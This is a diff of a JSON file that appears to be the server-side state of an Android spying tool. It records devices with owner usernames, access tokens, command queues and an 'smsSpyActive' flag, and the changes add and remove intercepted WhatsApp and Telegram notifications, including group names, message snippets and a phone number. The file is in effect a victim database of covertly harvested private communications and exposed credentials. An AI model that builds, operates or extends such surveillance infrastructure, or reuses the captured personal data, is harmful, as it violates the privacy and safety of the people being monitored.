@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776768214000,
+    "lastSeen": 1776768215298,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -4876,6 +4876,22 @@
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
+        "content": "‎‎3826 pesan dari 21 chat",
+        "time": "21/04 17:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768214780
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB byone/mabar ff 8a (2 pesan): Givano",
+        "content": "Kapan main Nye ni",
+        "time": "21/04 17:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768214758
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
         "content": "‎‎3825 pesan dari 21 chat",
         "time": "21/04 17:43",
         "pkg": "com.whatsapp",
@@ -8856,22 +8872,6 @@
         "time": "21/04 17:18",
         "pkg": "com.whatsapp",
         "receivedAt": 1776766682627
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (160 pesan): ~ hyurά",
-        "content": "Sayonara @⁨+62 831-1410-9918⁩",
-        "time": "21/04 17:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766680083
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎4263 pesan dari 21 chat",
-        "time": "21/04 17:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766680066
       }
     ],
     "galleryPhotos": [],
@@ -8890,7 +8890,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776768213760,
+    "lastSeen": 1776768215797,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -8931,7 +8931,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776768214346,
+    "lastSeen": 1776768216517,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -8947,6 +8947,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16923 pesan baru dari 112 obrolan",
+        "time": "21/04 17:43",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768216906
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:43",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768214874
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:43",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768214866
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:43",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768214854
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:43",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768214836
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:43",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768214646
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
